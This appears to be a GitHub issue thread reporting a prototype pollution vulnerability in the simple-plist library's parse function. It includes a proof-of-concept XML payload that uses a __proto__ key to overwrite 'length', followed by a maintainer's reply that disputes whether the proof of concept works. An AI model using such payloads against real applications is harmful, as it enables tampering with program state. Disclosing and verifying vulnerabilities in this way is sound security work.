| Hi, There's a prototype pollution vulnerability in .parse() related to the xml that are being parsed in it. In the following example the prototype pollution will affect the length parameter.  ``` var plist = require('simple-plist');  var xml = ` <plist version="1.0">     <key>metadata</key>     <dict>       <key>bundle-identifier</key>       <string>com.company.app</string>     </dict>   </plist>`;  console.log(plist.parse(xml)); /**  * * * * * * * * * * * * * * * * * * * * * * * * * *  * * * * END OF THE NORMAL CODE EXAMPLE! * * * * * *   * * * * * * * * * * * * * * * * * * * * * * * * * *   **/   /**  * * * * * * * * * * * *  * PROTOTYPE POLLUTION *  * * * * * * * * * * * *  **/ var xmlPollution = ` <plist version="1.0">   <dict>     <key>__proto__</key>     <dict>       <key>length</key>       <string>polluted</string>     </dict>   </dict> </plist>`; console.log(plist.parse(xmlPollution).length); // polluted ```  More information about the vulnerability: <https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf> |

| [@srithar21](https://github.com/srithar21) - I'm not sure how they're able to do that. I attempted to verify their POC by adding a test for it and the underlying [plist.js](https://www.npmjs.com/package/plist) library throws when it detects a `__proto__` key.  [image](https://user-images.githubusercontent.com/2027935/161389816-d5dab1ba-8d84-4039-8f09-d34061d7dd80.png)  Less important, but also a little suspicious, their POC wouldn't work anyway because the first byte is an unexpected ASCII sequence which would have made `simple-plist` attempt to use the binary parser. Since the file isn't binary, their example results in a different error with the message `"Unable to determine format for plist aStringOrBuffer"`.  It's entirely possible if not likely that their POC is suffering from a formatting problem, but it's still worth noting since the POC doesn't appear to be valid.  Happy to be wrong about this if someone can point out something that I might be missing. |
